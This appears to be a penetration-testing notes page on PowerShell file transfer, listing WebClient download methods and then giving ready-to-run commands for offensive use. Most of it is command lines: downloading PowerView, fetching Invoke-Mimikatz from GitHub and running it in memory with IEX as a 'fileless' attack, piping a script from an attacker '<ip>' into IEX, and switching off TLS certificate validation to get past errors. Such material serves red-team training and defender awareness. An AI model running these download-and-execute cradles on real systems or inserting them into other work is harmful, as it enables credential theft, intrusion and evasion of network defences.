---
icon: windows
---

# PowerShell Web Download

Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.

PowerShell offers many file transfer options. In any version of PowerShell, the **System.Net.WebClient** class can be used to download a file over HTTP, HTTPS or FTP. The following table describes **WebClient** methods for downloading data from a resource:

| Method              | Description                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| OpenRead            | Returns the data from a resource as a Stream.                                                |
| OpenReadAsync       | Returns the data from a resource without blocking the calling thread.                        |
| DownloadData        | Downloads data from a resource and returns a Byte array.                                     |
| DownloadDataAsync   | Downloads data from a resource and returns a Byte array without blocking the calling thread. |
| DownloadFile        | Downloads data from a resource to a local file.                                              |
| DownloadFileAsync   | Downloads data from a resource to a local file without blocking the calling thread.          |
| DownloadString      | Downloads a String from a resource and returns a String.                                     |
| DownloadStringAsync | Downloads a String from a resource without blocking the calling thread.                      |

## Invoke-WebRequest File Download

From PowerShell 3.0 onwards, the **Invoke-WebRequest** cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases _iwr_, _curl_, and _wget_ instead of the Invoke-WebRequest full name.

Example usage:

```powershell
PS C:\> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

## Web.Client File Download

We can specify the class name **Net.WebClient** and the method **DownloadFile** with the parameters corresponding to the URL of the target file to download and the output file name.

Example command:

```powershell
PS C:\> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

Download PowerView:

```powershell
PS C:\> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

Download PowerView asynchronously:

```powershell
PS C:\> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

## Fileless Download

Fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the **Invoke-Expression** cmdlet or the alias **IEX**.

IEX example:

```powershell
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

IEX pipeline input:

```powershell
PS C:\> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

***

## Debug

#### Internet Explorer First Launch

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

This can be bypassed using the parameter **-UseBasicParsing**.

```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Example:

```powershell
PS C:\> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

#### SSL/TLS Secure Channel: Certificate is not Trusted

Bypass this error with the following command:

```powershell
PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
